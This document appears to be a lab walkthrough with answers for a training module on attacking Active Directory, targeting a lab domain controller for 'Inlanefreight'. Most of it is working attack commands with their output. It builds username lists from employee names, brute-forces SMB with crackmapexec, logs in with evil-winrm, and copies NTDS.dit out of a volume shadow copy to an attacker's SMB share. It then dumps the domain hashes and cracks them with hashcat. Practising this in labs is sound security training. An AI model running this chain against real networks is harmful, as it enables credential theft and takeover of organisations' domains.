# Attacking Active Directory & NTDS.dit

### What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts?

```
NTDS.dit
```

### Submit the NT hash associated with the Administrator user from the example output in the section reading.

```
64f12cddaa88057e06a81b54e73b949b
```

### On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy john marston > john.txt
#use crackmap to brute force smb
crackmapexec smb 10.129.202.85 -u john.txt -p /usr/share/wordlists/fasttrack.txt
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

We can connect to a target DC using the credentials we captured.

```bash
evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
#we can check to see what privileges
net localgroup #look for *Administrators
net user jmarston # look for *Domain Admins
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

**Creating Shadow Copy of C:**

```bash
vssadmin CREATE SHADOW /For=C:
#Successfully created shadow copy for 'C:\'
#    Shadow Copy ID: {8e2dd360-d2bd-4758-a9a3-f48815492eff}
#    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\
```

now create smb share on our linux and transfer ntsdit through smb

```bash
#1
impacket-smbserver shared -smb2support /tmp/shared  
#2
move ntds.dit \\10.10.14.179\shared
```

**A Faster Method: Using cme to Capture NTDS.dit**

```bash
crackmapexec smb 10.129.179.147 -u jmarston -p 'P@ssword!' --ntds
SMB         10.129.179.147  445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
SMB         10.129.179.147  445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.179.147  445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
SMB         10.129.179.147  445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
SMB         10.129.179.147  445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
SMB         10.129.179.147  445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
SMB         10.129.179.147  445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
SMB         10.129.179.147  445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:14e8c74f478c1d905d7ae492d04cbee2:::
SMB         10.129.179.147  445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
SMB         10.129.179.147  445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/kali/.cme/logs/ILF-DC01_10.129.179.147_2024-02-19_032615.ntds of which 7 were added to the database
```

crack it now with hashcat

```bash
vim hash.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:14e8c74f478c1d905d7ae492d04cbee2:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
#hashcat command
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt 
92fd67fd2f49d0e83744aa82363f021b:Winter2008 #jstapleton
```
